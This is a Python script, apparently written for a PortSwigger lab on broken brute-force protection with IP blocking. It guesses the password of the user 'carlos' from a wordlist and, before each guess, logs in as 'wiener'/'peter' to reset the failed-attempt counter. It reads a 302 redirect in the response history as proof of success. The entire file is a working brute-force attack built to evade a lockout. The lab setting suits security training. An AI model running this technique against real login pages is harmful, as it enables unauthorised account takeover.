# Lab4 in portswigger: Broken brute-force protection, IP block
# This is a script for guessing the password for the login page which blocks my IP address after some failed attempts.import requests.
import requests
from termcolor import colored

url = "" # Set the url.
cookies = {"session": "XZ95J2WGZe3iQa2jCkkDrbLnieltBk8d"} # Change it with your cookie value.
  
def guess_password(username):
    with open("/PATH/passwords.txt","r") as file: # Modify it with the passwords list path.
        for password in file:
            password = password.strip()
            
            data = {"username": "wiener", "password": "peter"} 
            response = requests.post(url, cookies=cookies, data=data)
            print(data)
            print(response.history)  # [<Response [302]>]
            # print(str(response.history))
            # print(type(response.history[0]))

            data = {"username": username, "password": password} 
            intended_response = requests.post(url, cookies=cookies, data=data)
            print(data)
            print(intended_response.history)   
            
            '''The password will be valid if the username is "carlos" and the direction happened at least one time in the "history" list of the response during logging in so it will be succeeded.'''
            
            if (username == "carlos") and (len(intended_response.history) == 1):
                print(colored(f"[+] Valid password is found... ","green"))
                return password  
            else:
                print(colored(f"[!!] Incorrect password: {password}\n","red"))    
                   
def main():
    username = "carlos"
    password = guess_password(username)
    print()
    print(colored(f"[+] Password: --> {password}","green"))    

if __name__ == '__main__':
    main() 
